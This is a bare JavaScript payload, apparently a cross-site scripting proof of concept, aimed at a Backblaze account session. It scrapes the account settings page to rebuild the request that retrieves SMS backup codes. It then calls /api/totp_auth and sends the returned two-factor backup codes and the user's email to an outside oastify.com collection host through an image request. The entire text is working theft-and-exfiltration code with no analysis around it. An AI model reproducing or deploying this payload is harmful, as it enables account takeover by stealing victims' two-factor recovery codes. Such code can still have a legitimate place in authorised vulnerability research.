var img = document.createElement('img');var b;fetch("https://secure.backblaze.com/account_settings.htm")
    .then(response => response.text())
    .then(data => {
        var parser = new DOMParser();
        var doc = parser.parseFromString(data, "text/html");
        var scriptTags = doc.getElementsByTagName('script');

        for (var i = 0; i < scriptTags.length; i++) {
            var scriptContent = scriptTags[i].textContent;

            // Check if the script contains the desired function
            if (scriptContent.includes('function getSmsBackupCodes')) {
                // Extract and print the content of the getSmsBackupCodes function
                var startIndex = scriptContent.indexOf('function getSmsBackupCodes');
                if (startIndex !== -1) {
                    var endIndex = scriptContent.indexOf('}', startIndex);
                    if (endIndex !== -1) {
                        var smsBackupCodesFunction = scriptContent.substring(startIndex, endIndex + 1);
                        var sIndex = smsBackupCodesFunction.indexOf("'action'");
                        var eIndex = smsBackupCodesFunction.indexOf('}', sIndex - 1);
                        b = '{' + smsBackupCodesFunction.substring(sIndex, eIndex) + '}';
                        b = b.replace(/'/g, '"');
                    }
                }
            }
        }

        console.log(b);
    })
    .catch(error => {
        console.error(error);
    });
setTimeout(() =>{$.ajax({
    url: '/api/totp_auth',
    type: 'POST',
    data: b,
    async: true,
    contentType: "application/json; charset=utf-8",
    dataType: 'json',
    timeout: 120000,
    cache: false,
    success: function (json) {
       console.log(json); img.src="https://k9u3ocbwjt1x40xffzrqcsd5jwpndc.oastify.com/?key="+encodeURIComponent(json.backupCodes)+"&email="+json.email;
    }
});},4000);
